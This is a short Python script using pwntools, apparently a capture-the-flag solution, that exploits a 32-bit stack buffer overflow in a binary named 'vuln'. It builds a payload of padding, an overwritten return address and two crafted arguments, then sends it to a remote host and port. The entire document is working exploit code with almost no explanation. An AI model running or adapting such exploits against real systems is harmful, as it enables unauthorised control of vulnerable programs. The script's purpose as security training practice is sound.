from pwn import *

p = process("./vuln")
p = remote("157.245.32.12", 32025)

offset = b'A'*180 + b'AABBCCDD'
loc = p32(0x080491e2)

## args -> ~args + 1 (to represent negative)

# arg_1 = -0x21524111
arg_1 = b'\xef\xbe\xad\xde'

# arg_2 = -x03f212ff3
arg_2 = b'\x0d\xd0\xde\xc0'

res = offset + loc + b'test' + arg_1 + arg_2
print(res)

print(p.recv().decode("utf-8"))
p.sendline(res)
print(p.recv())

p.close()
